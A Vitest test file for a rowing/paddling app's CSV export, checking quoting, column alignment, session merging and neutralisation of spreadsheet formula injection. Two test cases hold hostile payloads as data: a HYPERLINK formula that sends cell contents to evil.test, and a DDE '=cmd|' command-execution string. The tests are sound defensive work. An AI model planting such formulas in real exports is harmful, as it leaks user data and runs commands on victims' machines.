import { describe, it, expect } from "vitest";
import {
  escapeCell,
  toCSV,
  toExportRows,
  exportFilename,
  SESSION_COLUMNS,
  type Column,
} from "../csv";

describe("escapeCell", () => {
  it("passes ordinary values straight through", () => {
    expect(escapeCell("steady")).toBe("steady");
    expect(escapeCell(2000)).toBe("2000");
    expect(escapeCell(0)).toBe("0");
  });

  it("renders missing values as empty, not as the word undefined", () => {
    expect(escapeCell(undefined)).toBe("");
    expect(escapeCell(null)).toBe("");
    // A real zero is data and must survive.
    expect(escapeCell(0)).toBe("0");
  });

  it("quotes a field containing the delimiter", () => {
    // Without this every column after the note shifts by one.
    expect(escapeCell("windy, choppy")).toBe('"windy, choppy"');
  });

  it("doubles embedded quotes", () => {
    expect(escapeCell('he said "go"')).toBe('"he said ""go"""');
  });

  it("quotes newlines so one session stays one row", () => {
    expect(escapeCell("line one\nline two")).toBe('"line one\nline two"');
    expect(escapeCell("line one\r\nline two")).toBe('"line one\r\nline two"');
  });

  it("neutralises a value a spreadsheet would run as a formula", () => {
    // Notes are free text. Opened in Excel, a leading = is executed.
    expect(escapeCell("=1+1")).toBe("'=1+1");
    expect(escapeCell("+1")).toBe("'+1");
    expect(escapeCell("@SUM(A1)")).toBe("'@SUM(A1)");
    expect(escapeCell("-5")).toBe("'-5");
  });

  it("neutralises the classic exfiltration payload", () => {
    const attack = '=HYPERLINK("http://evil.test?"&A1,"click")';
    const out = escapeCell(attack);
    // It contains a comma and quotes, so it is RFC-quoted as well as
    // neutralised: the field opens with a quote, then the apostrophe.
    expect(out.startsWith(`"'=`)).toBe(true);
    expect(out).not.toMatch(/^=/);
  });

  it("still quotes a neutralised value that also needs quoting", () => {
    const out = escapeCell("=a,b");
    expect(out).toBe(`"'=a,b"`);
  });

  it("leaves negative numbers readable while keeping them inert", () => {
    // A numeric -5 is a number, not a typed string, but it takes the same
    // path; the apostrophe is the price of not evaluating "-1+1".
    expect(escapeCell(-5)).toBe("'-5");
  });

  it("formats dates in a sortable, unambiguous way", () => {
    expect(escapeCell(new Date("2026-06-10T00:00:00Z"))).toBe("2026-06-10T00:00:00.000Z");
  });
});

describe("toCSV", () => {
  interface Row {
    a: string;
    b?: number;
  }
  const cols: Column<Row>[] = [
    { key: "a", header: "A" },
    { key: "b", header: "B" },
  ];

  it("writes a header even with no rows", () => {
    // An empty export should still be a valid file you can open.
    expect(toCSV([], cols)).toBe("A,B");
  });

  it("writes one line per row, CRLF separated", () => {
    const csv = toCSV([{ a: "x", b: 1 }, { a: "y", b: 2 }], cols);
    expect(csv).toBe("A,B\r\nx,1\r\ny,2");
  });

  it("keeps columns aligned when a field is missing", () => {
    // Inferring columns from the first row would drop b entirely here.
    const csv = toCSV([{ a: "x" }, { a: "y", b: 2 }], cols);
    expect(csv.split("\r\n")).toEqual(["A,B", "x,", "y,2"]);
  });

  it("escapes headers too", () => {
    const csv = toCSV<Row>([], [{ key: "a", header: "Pace, per 500m" }]);
    expect(csv).toBe('"Pace, per 500m"');
  });

  it("uses a custom getter when given one", () => {
    const csv = toCSV<Row>([{ a: "x" }], [{ key: "a", header: "A", get: (r) => r.a.toUpperCase() }]);
    expect(csv).toBe("A\r\nX");
  });
});

describe("toExportRows", () => {
  const erg = {
    date: "2026-06-10", distance_m: 2000, duration_sec: 480, split_sec: 120,
    stroke_rate: 70, rpe: 6, paddle_side: "left", workout_type: "steady",
    watts: 210, notes: "felt good", synced: 1,
  };
  const water = {
    date: "2026-06-12", distance_m: 5000, duration_sec: 1800, avg_pace_sec: 180,
    rpe: 4, boat_type: "oc1", water_condition: "flat", synced: 0,
  };
  const team = {
    date: "2026-06-11", distance_m: 8000, duration_min: 90,
    practice_type: "endurance", paddle_side: "right", rpe: 6,
  };
  const dryland = { date: "2026-06-09", duration_min: 45, rpe: 5, session_type: "strength" };

  it("brings every session type into one table", () => {
    const rows = toExportRows({ erg: [erg], water: [water], team: [team], dryland: [dryland] });
    expect(rows).toHaveLength(4);
    expect(rows.map((r) => r.type).sort()).toEqual(["dryland", "erg", "team", "water"]);
  });

  it("orders newest first, across types", () => {
    const rows = toExportRows({ erg: [erg], water: [water], team: [team], dryland: [dryland] });
    expect(rows.map((r) => r.date)).toEqual([
      "2026-06-12", "2026-06-11", "2026-06-10", "2026-06-09",
    ]);
  });

  it("puts pace in one column whatever the source field is called", () => {
    // Erg calls it split_sec and water calls it avg_pace_sec; comparing them
    // in a spreadsheet means they have to land in the same column.
    const rows = toExportRows({ erg: [erg], water: [water] });
    expect(rows.find((r) => r.type === "erg")?.pace_per_500m_sec).toBe(120);
    expect(rows.find((r) => r.type === "water")?.pace_per_500m_sec).toBe(180);
  });

  it("converts practice minutes to seconds so durations are comparable", () => {
    const rows = toExportRows({ team: [team], dryland: [dryland] });
    expect(rows.find((r) => r.type === "team")?.duration_sec).toBe(5400);
    expect(rows.find((r) => r.type === "dryland")?.duration_sec).toBe(2700);
  });

  it("reports whether a session has reached the server", () => {
    // Someone exporting because sync looks stuck needs to see which rows are
    // still local-only.
    const rows = toExportRows({ erg: [erg], water: [water] });
    expect(rows.find((r) => r.type === "erg")?.synced).toBe(true);
    expect(rows.find((r) => r.type === "water")?.synced).toBe(false);
  });

  it("leaves inapplicable fields empty rather than inventing zeroes", () => {
    // A dryland session has no distance; exporting 0 would make it look like
    // a session where the athlete covered nothing.
    const [row] = toExportRows({ dryland: [dryland] });
    expect(row.distance_m).toBeUndefined();
    expect(row.pace_per_500m_sec).toBeUndefined();
  });

  it("handles an empty bundle and missing keys", () => {
    expect(toExportRows({})).toEqual([]);
    expect(toExportRows({ erg: [], water: [] })).toEqual([]);
  });

  it("survives a malformed row instead of throwing", () => {
    // Rows come out of IndexedDB, which has held data from older versions.
    const rows = toExportRows({ erg: [{ date: "2026-06-10", distance_m: "oops" }] });
    expect(rows).toHaveLength(1);
    expect(rows[0].distance_m).toBeUndefined();
  });
});

describe("the whole export", () => {
  it("produces a file with a row per session and no column drift", () => {
    const rows = toExportRows({
      erg: [{ date: "2026-06-10", distance_m: 2000, notes: "windy, choppy" }],
      water: [{ date: "2026-06-11", distance_m: 5000, notes: 'said "ok"' }],
    });
    const csv = toCSV(rows, SESSION_COLUMNS);
    const lines = csv.split("\r\n");

    expect(lines).toHaveLength(3);
    // Every line must have the same number of fields once quoting is honoured.
    const fieldCount = (line: string) => line.match(/(?:^|,)("(?:[^"]|"")*"|[^,]*)/g)?.length;
    expect(fieldCount(lines[1])).toBe(fieldCount(lines[0]));
    expect(fieldCount(lines[2])).toBe(fieldCount(lines[0]));
  });

  it("carries a formula-shaped note through to the file inert", () => {
    const rows = toExportRows({ erg: [{ date: "2026-06-10", notes: "=cmd|'/c calc'!A1" }] });
    const csv = toCSV(rows, SESSION_COLUMNS);
    expect(csv).toContain("'=cmd");
    expect(csv).not.toMatch(/,=cmd/);
  });
});

describe("exportFilename", () => {
  it("dates the file so repeated exports don't collide", () => {
    expect(exportFilename("2026-08-26")).toBe("paddleiq-sessions-2026-08-26.csv");
  });
});
